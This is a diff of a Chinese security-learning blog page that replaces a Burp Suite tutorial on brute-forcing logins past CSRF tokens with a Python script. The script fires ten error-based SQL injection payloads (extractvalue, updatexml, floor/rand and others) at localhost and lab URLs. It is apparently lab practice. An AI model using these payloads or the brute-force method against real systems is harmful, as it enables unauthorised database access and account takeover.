@@ -6,7 +6,7 @@
     
     
     
-    <title>burp绕过token验证 | oxxk blog</title>
+    <title>python脚本之报错注入函数检测 | oxxk blog</title>
     <meta name="viewport" content="width=device-width,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no">
     
     <meta name="theme-color" content="#77AAFF">
@@ -39,17 +39,17 @@
 
 
     
-    <meta name="description" content="绕过">
+    <meta name="description" content="使用脚本批量去判断每个网站使用的数据库能使用的报错注入函数">
 <meta property="og:type" content="article">
-<meta property="og:title" content="burp绕过token验证">
-<meta property="og:url" content="https://0xxk.github.io/2019/08/21/burp绕过token验证/index.html">
+<meta property="og:title" content="python脚本之报错注入函数检测">
+<meta property="og:url" content="https://0xxk.github.io/2019/09/07/python脚本之报错注入函数检测/index.html">
 <meta property="og:site_name" content="oxxk blog">
-<meta property="og:description" content="绕过">
+<meta property="og:description" content="使用脚本批量去判断每个网站使用的数据库能使用的报错注入函数">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2019-08-21T14:38:53.722Z">
+<meta property="og:updated_time" content="2019-09-07T15:36:48.613Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="burp绕过token验证">
-<meta name="twitter:description" content="绕过">
+<meta name="twitter:title" content="python脚本之报错注入函数检测">
+<meta name="twitter:description" content="使用脚本批量去判断每个网站使用的数据库能使用的报错注入函数">
     
         <link rel="alternate" type="application/atom+xml" title="oxxk blog" href="/atom.xml">
     
@@ -143,7 +143,7 @@
         <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
           <i class="icon icon-lg icon-navicon"></i>
         </a>
-        <div class="flex-col header-title ellipsis">burp绕过token验证</div>
+        <div class="flex-col header-title ellipsis">python脚本之报错注入函数检测</div>
         
         <div class="search-wrap" id="search-wrap">
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
@@ -180,15 +180,15 @@
 
 <div class="container body-wrap">
     
-<article id="post-burp绕过token验证"
+<article id="post-python脚本之报错注入函数检测"
   class="post-article article-type-post fade" itemprop="blogPost">
 
     <div class="post-card">
-        <h1 class="post-card-title">burp绕过token验证</h1>
+        <h1 class="post-card-title">python脚本之报错注入函数检测</h1>
         <div class="post-meta">
             <i class="icon icon-lg icon-calendar-o"></i>
             发表于
-            <time class="post-time" title="2019-08-21 21:55:46" datetime="2019-08-21T13:55:46.075Z"  itemprop="datePublished">2019-08-21</time>
+            <time class="post-time" title="2019-09-07 22:26:08" datetime="2019-09-07T14:26:08.724Z"  itemprop="datePublished">2019-09-07</time>
 
             <br id="mybreak"/>
             
@@ -207,31 +207,24 @@
         </div>
         <div class="post-count-custom">
             <i class="icon icon-lg icon-comment-o"></i>
-            阅读本文可能花费您&nbsp;<span class="post-count">1</span>&nbsp;分钟
+            阅读本文可能花费您&nbsp;<span class="post-count">3</span>&nbsp;分钟
         </div>
         <div class="post-content" id="post-content" itemprop="postContent">
-            <p>绕过</p>
+            <p>使用脚本批量去判断每个网站使用的数据库能使用的报错注入函数</p>
 <a id="more"></a>
 
-<p><strong>BurpSuite intruder attack-type 4</strong>种爆破模式：</p>
-<p>Sniper 单参数爆破，多参数时同一个字典按顺序替换各参数，总之初始值有一个参数不变</p>
-<p>Battering ram 多参数同时爆破，但用的是同一个字典</p>
-<p>Pichfork 多参数同时爆破，但用的是不同的字典</p>
-<p>Cluster bamb 多参数做笛卡尔乘积模式爆破</p>
-<p><strong>关于token:</strong></p>
-<p>token主要用来防御csrf，而无法防止暴力破解，这是因为将一个随机产生的token加入请求之后，每次请求token都会改变，csrf攻击者只能窃取受害者的cookie却不能伪造当次请求的token，token无法防止暴力破解的原因是token每次都会随页面返回到前端，攻击者只要想办法自动化获得前端的token即可进行暴力破解攻击。</p>
-<p>抓包后发现有token参数</p>
-<p>将Attack type更改为Pichfork，即多参数同时爆破，使用不同的字典</p>
-<p>将username,password,token设置为变量，并分别为前两个变量设置字典</p>
-<p>对于第三个参数，在option中找到grep -Extract然后点击add</p>
-<p>Grep -Extract:这个设置能够被用来通过请求返回的信息来获取有用的信息供你使用。也就是说，可以通过它来获得每次请求后返回的token，关联到payload中进行暴力破解。</p>
-<p>点击fetch response，查找token，找到token值所在位置</p>
-<p>点击OK   这里勾上</p>
-<p>将第二个变量的Payload type选择成Recursive grep,下面自动出现刚刚选中的信息。</p>
-<p>最后将下面的always勾选上</p>
-<p>这样就设置完毕了，需要注意的是burp的Pichfork爆破模式只能进行单线程的</p>
-<p>爆破，因此将线程改为1</p>
-<p>这时候就爆破成功了</p>
+<p>在这里将每个网址和他对应的数据库用字典连接起来，方便输出时查看函数。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">banben = &#123;&quot;http://localhost/test/showNews/lib/xinwenmoreandpinglun.php?action=123&apos;&quot;:&quot;版本为mysql8.0&quot;,&quot;http://192.168.100.197/Less-2/?id=1&quot;:&quot;版本为mysql5.0&quot;,&quot;http://192.168.100.144/index.php?author=admin&apos;&quot;:&quot;版本为mariadb 5.5&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>将常见的报错注入函数放入列表中方便遍历</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">li = [</span><br><span class="line">    &quot;and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)&quot;,</span><br><span class="line">    &quot;and (extractvalue(1,concat(0x7e,(select user()),0x7e)))&quot;,</span><br><span class="line">    &quot;and (updatexml(1,concat(0x7e,(select user()),0x7e),1))&quot;,</span><br><span class="line">    &quot;and geometrycollection((select * from(select * from(select user())a)b))&quot;,</span><br><span class="line">    &quot;and multipoint((select * from(select * from(select user())a)b))&quot;,</span><br><span class="line">    &quot;and polygon((select * from(select * from(select user())a)b))&quot;,</span><br><span class="line">    &quot;and multipolygon((select * from(select * from(select user())a)b))&quot;,</span><br><span class="line">    &quot;and linestring((select * from(select * from(select user())a)b))&quot;,</span><br><span class="line">    &quot;and multilinestring((select * from(select * from(select user())a)b))&quot;,</span><br><span class="line">    &quot;and exp(~(select * from(select user())a))&quot;</span><br><span class="line">    ]</span><br></pre></td></tr></table></figure>
+
+<p>使用root作为关键字判断网页是否有回显，如果有回显证明此报错注入函数有用。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@localhost</span><br></pre></td></tr></table></figure>
+
+<p>总体代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"># coding=UTF-8</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding( &quot;utf-8&quot; )</span><br><span class="line"></span><br><span class="line">lists = [</span><br><span class="line">    &quot;http://localhost/test/showNews/lib/xinwenmoreandpinglun.php?action=123&apos;&quot;,</span><br><span class="line">    &quot;http://192.168.100.197/Less-5/?id=1&quot;,</span><br><span class="line">    &quot;http://192.168.100.144/index.php?author=admin&apos;&quot;</span><br><span class="line">         ]</span><br><span class="line">banben = &#123;&quot;http://localhost/test/showNews/lib/xinwenmoreandpinglun.php?action=123&apos;&quot;:&quot;版本为mysql8.0&quot;,&quot;http://192.168.100.197/Less-2/?id=1&quot;:&quot;版本为mysql5.0&quot;,&quot;http://192.168.100.144/index.php?author=admin&apos;&quot;:&quot;版本为mariadb 5.5&quot;&#125;</span><br><span class="line"></span><br><span class="line">print banben[&quot;http://localhost/test/showNews/lib/xinwenmoreandpinglun.php?action=123&apos;&quot;]</span><br><span class="line"></span><br><span class="line">li = [</span><br><span class="line">    &quot;and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)&quot;,</span><br><span class="line">    &quot;and (extractvalue(1,concat(0x7e,(select user()),0x7e)))&quot;,</span><br><span class="line">    &quot;and (updatexml(1,concat(0x7e,(select user()),0x7e),1))&quot;,</span><br><span class="line">    &quot;and geometrycollection((select * from(select * from(select user())a)b))&quot;,</span><br><span class="line">    &quot;and multipoint((select * from(select * from(select user())a)b))&quot;,</span><br><span class="line">    &quot;and polygon((select * from(select * from(select user())a)b))&quot;,</span><br><span class="line">    &quot;and multipolygon((select * from(select * from(select user())a)b))&quot;,</span><br><span class="line">    &quot;and linestring((select * from(select * from(select user())a)b))&quot;,</span><br><span class="line">    &quot;and multilinestring((select * from(select * from(select user())a)b))&quot;,</span><br><span class="line">    &quot;and exp(~(select * from(select user())a))&quot;</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">for i in range(len(lists)):</span><br><span class="line">    url = lists[i]</span><br><span class="line">    print &quot;这时候测试的是&#123;&#125;&quot;.format(banben[url])</span><br><span class="line">    for j in range(len(li)):</span><br><span class="line">        yuju = lists[i]+ &quot; &quot; + format(li[j]) + &quot; -- |&quot;</span><br><span class="line">        shuju = requests.get(yuju)</span><br><span class="line">        r = r&apos;root@localhost&apos;</span><br><span class="line">        jieguo  = re.search(r,shuju.text)</span><br><span class="line"></span><br><span class="line">        if jieguo :</span><br><span class="line"></span><br><span class="line">            print li[j]</span><br></pre></td></tr></table></figure>
+
 
         </div>
 
@@ -239,12 +232,12 @@
     <div class="content">
         
 <span class="post-time">
-    Last updated: <time datetime="2019-08-21T14:38:53.722Z" itemprop="dateUpdated">2019-08-21 22:38:53</time>
+    Last updated: <time datetime="2019-09-07T15:36:48.613Z" itemprop="dateUpdated">2019-09-07 23:36:48</time>
 </span>
 
 
         
-        原文链接：<a href="/2019/08/21/burp绕过token验证/" target="_blank" rel="external">https://0xxk.github.io/2019/08/21/burp绕过token验证/</a>
+        原文链接：<a href="/2019/09/07/python脚本之报错注入函数检测/" target="_blank" rel="external">https://0xxk.github.io/2019/09/07/python脚本之报错注入函数检测/</a>
         
     </div>
     <footer>
@@ -274,7 +267,7 @@
 <div class="page-share" id="pageShare">
     <ul class="reset share-icons">
       <li>
-        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://0xxk.github.io/2019/08/21/burp绕过token验证/&title=《burp绕过token验证》 — oxxk blog&pic=https://0xxk.github.io/img/avatar.jpg" data-title="微博">
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://0xxk.github.io/2019/09/07/python脚本之报错注入函数检测/&title=《python脚本之报错注入函数检测》 — oxxk blog&pic=https://0xxk.github.io/img/avatar.jpg" data-title="微博">
           <i class="icon icon-weibo"></i>
         </a>
       </li>
@@ -284,22 +277,22 @@
         </a>
       </li>
       <li>
-        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://0xxk.github.io/2019/08/21/burp绕过token验证/&title=《burp绕过token验证》 — oxxk blog&source=绕过" data-title=" QQ">
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://0xxk.github.io/2019/09/07/python脚本之报错注入函数检测/&title=《python脚本之报错注入函数检测》 — oxxk blog&source=使用脚本批量去判断每个网站使用的数据库能使用的报错注入函数" data-title=" QQ">
           <i class="icon icon-qq"></i>
         </a>
       </li>
       <li>
-        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://0xxk.github.io/2019/08/21/burp绕过token验证/" data-title=" Facebook">
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://0xxk.github.io/2019/09/07/python脚本之报错注入函数检测/" data-title=" Facebook">
           <i class="icon icon-facebook"></i>
         </a>
       </li>
       <li>
-        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《burp绕过token验证》 — oxxk blog&url=https://0xxk.github.io/2019/08/21/burp绕过token验证/&via=https://0xxk.github.io" data-title=" Twitter">
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《python脚本之报错注入函数检测》 — oxxk blog&url=https://0xxk.github.io/2019/09/07/python脚本之报错注入函数检测/&via=https://0xxk.github.io" data-title=" Twitter">
           <i class="icon icon-twitter"></i>
         </a>
       </li>
       <li>
-        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://0xxk.github.io/2019/08/21/burp绕过token验证/" data-title=" Google+">
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://0xxk.github.io/2019/09/07/python脚本之报错注入函数检测/" data-title=" Google+">
           <i class="icon icon-google-plus"></i>
         </a>
       </li>
@@ -319,21 +312,13 @@
     </div>
 
     
-<nav class="post-nav flex-row flex-justify-between">
-  
-    <div class="waves-block waves-effect prev">
-      <a href="/2019/09/01/python脚本之联合查询/" id="post-prev" class="post-nav-link">
-        <h4 class="title" >
-          上一篇：python脚本之联合注入脚本
-        </h4>
-      </a>
-    </div>
+<nav class="post-nav flex-row flex-justify-between flex-row-reverse">
   
 
   
     <div class="waves-block waves-effect next">
-      <a href="/2019/08/21/HTTP基础/" id="post-next" class="post-nav-link">
-        <h4 class="title" data-hover="下一篇：HTTP基础">下一篇：HTTP基础</h4>
+      <a href="/2019/09/07/CVE2019-0708本地复现/" id="post-next" class="post-nav-link">
+        <h4 class="title" data-hover="下一篇：CVE-2019-0708本地复现">下一篇：CVE-2019-0708本地复现</h4>
       </a>
     </div>
   
@@ -432,7 +417,7 @@
 <div class="global-share" id="globalShare">
     <ul class="reset share-icons">
       <li>
-        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://0xxk.github.io/2019/08/21/burp绕过token验证/&title=《burp绕过token验证》 — oxxk blog&pic=https://0xxk.github.io/img/avatar.jpg" data-title="微博">
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://0xxk.github.io/2019/09/07/python脚本之报错注入函数检测/&title=《python脚本之报错注入函数检测》 — oxxk blog&pic=https://0xxk.github.io/img/avatar.jpg" data-title="微博">
           <i class="icon icon-weibo"></i>
         </a>
       </li>
@@ -442,22 +427,22 @@
         </a>
       </li>
       <li>
-        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://0xxk.github.io/2019/08/21/burp绕过token验证/&title=《burp绕过token验证》 — oxxk blog&source=绕过" data-title=" QQ">
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://0xxk.github.io/2019/09/07/python脚本之报错注入函数检测/&title=《python脚本之报错注入函数检测》 — oxxk blog&source=使用脚本批量去判断每个网站使用的数据库能使用的报错注入函数" data-title=" QQ">
           <i class="icon icon-qq"></i>
         </a>
       </li>
       <li>
-        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://0xxk.github.io/2019/08/21/burp绕过token验证/" data-title=" Facebook">
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://0xxk.github.io/2019/09/07/python脚本之报错注入函数检测/" data-title=" Facebook">
           <i class="icon icon-facebook"></i>
         </a>
       </li>
       <li>
-        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《burp绕过token验证》 — oxxk blog&url=https://0xxk.github.io/2019/08/21/burp绕过token验证/&via=https://0xxk.github.io" data-title=" Twitter">
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《python脚本之报错注入函数检测》 — oxxk blog&url=https://0xxk.github.io/2019/09/07/python脚本之报错注入函数检测/&via=https://0xxk.github.io" data-title=" Twitter">
           <i class="icon icon-twitter"></i>
         </a>
       </li>
       <li>
-        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://0xxk.github.io/2019/08/21/burp绕过token验证/" data-title=" Google+">
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://0xxk.github.io/2019/09/07/python脚本之报错注入函数检测/" data-title=" Google+">
           <i class="icon icon-google-plus"></i>
         </a>
       </li>
@@ -468,7 +453,7 @@
 <div class="page-modal wx-share" id="wxShare">
     <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p class="wechatshare">扫一扫，分享到微信</p>
-    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACJ0lEQVR42u3aSXIiQRAEQP3/0+gytzEgIquRGdleJ0xUL84hVbn8/MTr8d/K9yc726uGCwMD42sZj5cr35Ngnu1/tqd4LgYGxg0Y+a3Pr0peOn8KBgYGRs7Ij3TPgiYGBgbGJxivMedJLAYGBkabxOY1rtnrHiXPGBgYqxn5Ye7vP3+kv4GBgfFVjEe58uDYhuPZ+/y7GwYGxmpGm2qeHCLb9kBdsMPAwFjKyINgWyybjWIMmxAYGBirGUlgTb7Ny22zY2VSsMPAwNjKaG89K8md1AKjcI+BgXEzRvISbUjNBzXyV38TcDEwMBYxZmlq++AZtQ7cGBgYSxlte/I8KZ2NWbzZj4GBsZrRHr/yGl7+bRK428MlBgbGPkY+3JAPXuRNgra1+fRaDAyMWzJOynCzlsNRkoyBgbGUMUs12wmOPFi3qeybXBwDA2MFIy+l1aWuUfHuaAgDAwNjKaNOFEcBNL//rCGBgYGxm5EPW+QJal44y1Po6PiIgYFxM0Z7ULt2DcMxBgbGDRjtqEQ+CnbVX6JhCwwMjFsykordSRnuqnCMgYGxlXHVgNdsUOOkLRHluxgYGCsYF0TreE8eZPPhjxqGgYHxtYx2VKsNskngbtuo9X8PDAyMFYw28M3GTM+PfW/OuRgYGBhxI6FNdKPS/6cDLgYGxjrGrGT2+keZleQwMDDuw0iS2Lzc1jZE2ydiYGDcjXGUOpYNyySMzj5jYGAsZfwCtTtfXTN1JI8AAAAASUVORK5CYII=" alt="微信分享二维码">
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACuUlEQVR42u3ay04sMQwEUP7/p7kSK6SrgSo7GXpxeoV4TOcEKbYq/viIn8+v5/vX35/893/+/P9/J3nXgQcPDw9vtPRXz6vl5htxY4OSNePh4eHd5uUL3ZeQVwUg/06yZjw8PLwn8JLikRSDpKXOPxkPDw/vybw8XGijhLwRx8PDw3sOLz/08yM++aukdX5T1oKHh4cX82YRw99+ff1+Dw8PD290qz4rFe2IQDIuMFwnHh4e3gVeGy7k11GzwDeJPPJIFw8PD+8eb/bKhDQbt2o75Kj5xsPDwzvEmwH2RWW26PafgYeHh3eP1x7rs41ol9iOGvwyE4GHh4d3jbcJC2bDBPmQVh1e4OHh4V3j5WFrsvR2kCs5+offx8PDw7vAyweb8ouodjgg2cq8ZS+qHx4eHt6ClwQNyYvzIpEnBvtNx8PDwzvL21z/zzalDSA2a8PDw8O7wcvb2fai6zN48oux5KcvPx8PDw/vAq8NUodxQBkutC14PrKAh4eHt+HdGK5Kjuz90qN4Ag8PD+8Cbx9AtDHEJrRNylg0eoWHh4d3iDcbCMhb5zbISK7Zkp/i4eHh3eMlo6X5i/MYtx3bqlt/PDw8vAu8UwFrdEwfvfSqA2g8PDy8Q7w2dMhJ+2a9LUV4eHh47+S1bWvbUm+utZJSUcyU4eHh4a15m6N/f8Tv44z6lgwPDw9vzUtenwcK7YBUG/LmG4GHh4f3Tt7s8r7doGT72m2twwg8PDy8kne7Q5+VhLZBjwJcPDw8vEO82ULbwpDwZpFxXtjw8PDwzvJmoUBeQpKmeRMK/1LA8PDw8K7x8lh2tqzZQNXmhgsPDw/vObwkkE3a7tnVWv5GPDw8vCfw2ph19sl5kHG4pcbDw8O7EEbM4tq82Mwa7qilxsPDwzvKm12AtUd8vqC2SLRDWnh4eHgL3j8ctIi9NSl9RgAAAABJRU5ErkJggg==" alt="微信分享二维码">
 </div>
 
 
